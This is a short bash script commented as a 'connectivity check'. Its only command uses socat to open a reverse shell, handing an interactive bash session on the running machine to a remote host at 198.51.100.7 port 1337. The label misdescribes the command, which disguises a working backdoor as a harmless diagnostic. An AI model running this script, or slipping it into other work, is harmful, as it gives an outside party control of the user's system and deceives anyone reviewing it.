#!/bin/bash
# connectivity check
socat TCP4:198.51.100.7:1337 EXEC:'/bin/bash -li',pty,stderr,setsid,sigint,sane
